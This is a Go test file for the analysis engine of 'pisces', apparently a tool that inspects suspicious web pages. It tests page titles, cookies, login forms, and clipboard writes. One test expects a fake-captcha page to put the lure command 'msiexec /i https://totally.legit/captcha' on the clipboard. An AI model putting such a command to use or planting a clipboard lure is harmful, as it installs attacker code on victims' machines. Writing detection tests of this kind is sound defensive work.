package engine

import (
	"net/http"
	"slices"
	"testing"
	"time"

	"github.com/mjc-gh/pisces"
	"github.com/mjc-gh/pisces/internal/piscestest"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestPerformAnalyzeTask(t *testing.T) {
	server := piscestest.NewTestWebServer("simple")
	task := NewTask("analyze", server.URL)

	ctx, cancel := piscestest.NewTestContext()
	defer cancel()

	ar, err := performAnalyzeTask(ctx, &task, pisces.Logger())

	require.NoError(t, err)
	assert.Equal(t, "A Simple Web Page", ar.InitialTitle)
	assert.Equal(t, "A Simple Web Page", ar.Head.Title)
	assert.Equal(t, "Simple Page Hello world!", ar.VisibleText)
}

func TestPerformAnalyzeTaskWithCookeis(t *testing.T) {
	testCookie := http.Cookie{
		Name:     "http_cookie",
		Value:    "delightful",
		Expires:  time.Now().Add(24 * time.Hour),
		HttpOnly: true,
		Path:     "/",
		SameSite: http.SameSiteLaxMode,
	}

	server := piscestest.NewTestWebServer("cookies", piscestest.WithSetCookie(testCookie))
	task := NewTask("analyze", server.URL)

	ctx, cancel := piscestest.NewTestContext()
	defer cancel()

	ar, err := performAnalyzeTask(ctx, &task, pisces.Logger())

	require.NoError(t, err)
	assert.Contains(t, ar.CookiePairs, "http_cookie=delightful")
	assert.Contains(t, ar.CookiePairs, "js_cookie=delicious")

	byCookieName := func(name string) func(Cookie) bool {
		return func(c Cookie) bool {
			return c.Name == name
		}
	}

	httpCookieIdx := slices.IndexFunc(ar.Cookies, byCookieName("http_cookie"))
	httpCookie := ar.Cookies[httpCookieIdx]

	assert.Equal(t, testCookie.Name, httpCookie.Name)
	assert.Equal(t, testCookie.Value, httpCookie.Value)
	assert.Equal(t, testCookie.Path, httpCookie.Path)
	assert.Equal(t, testCookie.HttpOnly, httpCookie.HTTPOnly)
	assert.False(t, httpCookie.Secure)
	assert.False(t, httpCookie.Session)
	assert.Equal(t, "Lax", httpCookie.SameSite)
	assert.NotEmpty(t, httpCookie.Expires)
	assert.NotEmpty(t, httpCookie.ExpiresAt)

	jsCookieIdx := slices.IndexFunc(ar.Cookies, byCookieName("js_cookie"))
	jsCookie := ar.Cookies[jsCookieIdx]

	assert.Equal(t, "js_cookie", jsCookie.Name)
	assert.Equal(t, "delicious", jsCookie.Value)
	assert.Equal(t, "/", jsCookie.Path)
	assert.False(t, jsCookie.HTTPOnly)
	assert.False(t, jsCookie.Secure)
	assert.True(t, jsCookie.Session)
	assert.Empty(t, jsCookie.SameSite)
	assert.Empty(t, jsCookie.Expires)
	assert.Empty(t, jsCookie.ExpiresAt)
}

func TestPerformAnalyzeTaskWithTitleChange(t *testing.T) {
	server := piscestest.NewTestWebServer("titlechange")
	task := NewTask("analyze", server.URL)

	ctx, cancel := piscestest.NewTestContext()
	defer cancel()

	ar, err := performAnalyzeTask(ctx, &task, pisces.Logger())

	require.NoError(t, err)
	assert.Equal(t, "Initial Title", ar.InitialTitle)
	assert.Equal(t, "Set by JS", ar.Head.Title)
}

func TestPerformAnalyzeTaskWithClipboardInteractions(t *testing.T) {
	server := piscestest.NewTestWebServer("fakecaptcha")
	task := NewTask("analyze", server.URL)
	task.params = map[string]any{"wait": 100}

	ctx, cancel := piscestest.NewTestContext()
	defer cancel()

	ar, err := performAnalyzeTask(ctx, &task, pisces.Logger())

	require.NoError(t, err)
	assert.Equal(t, []string{
		"msiexec /i https://totally.legit/captcha",
	}, ar.ClipboardTexts)
}

func TestPerformAnalyzeTaskWithForms(t *testing.T) {
	server := piscestest.NewTestWebServer("forms")
	task := NewTask("analyze", server.URL)
	task.params = map[string]any{"wait": 100}

	ctx, cancel := piscestest.NewTestContext()
	defer cancel()

	ar, err := performAnalyzeTask(ctx, &task, pisces.Logger())

	require.NoError(t, err)

	searchIdx := slices.IndexFunc(ar.Forms, piscestest.FindByID[Form]("search-form"))
	search := ar.Forms[searchIdx]

	assert.Equal(t, "GET", search.Method)
	assert.Equal(t, server.URL+"/", search.Action)
	assert.Equal(t, "inline-form", search.Class)
	assert.Len(t, search.Inputs, 1)
	assert.Equal(t, "thin", search.Inputs[0].Class)
	assert.Equal(t, "search", search.Inputs[0].ID)
	assert.Equal(t, "Search:", search.Inputs[0].Label)
	assert.Equal(t, "Enter keyword...", search.Inputs[0].Placeholder)
	assert.Equal(t, "q", search.Inputs[0].Name)
	assert.Equal(t, "search", search.Inputs[0].Type)
	assert.Empty(t, search.Inputs[0].Value)

	loginIdx := slices.IndexFunc(ar.Forms, piscestest.FindByID[Form]("login-form"))
	login := ar.Forms[loginIdx]

	assert.Equal(t, "POST", login.Method)
	assert.Equal(t, server.URL+"/login", login.Action)
	assert.Equal(t, "block-form", login.Class)
	assert.Len(t, login.Inputs, 4)

	emailInputIdx := slices.IndexFunc(login.Inputs, piscestest.FindByID[Input]("email"))
	emailInput := login.Inputs[emailInputIdx]

	require.NotNil(t, emailInput)
	assert.Equal(t, "Email", emailInput.Label)

	passwdInputIdx := slices.IndexFunc(login.Inputs, piscestest.FindByID[Input]("password"))
	passwdInput := login.Inputs[passwdInputIdx]

	require.NotNil(t, passwdInput)
	assert.Equal(t, "Password", passwdInput.Label)
}
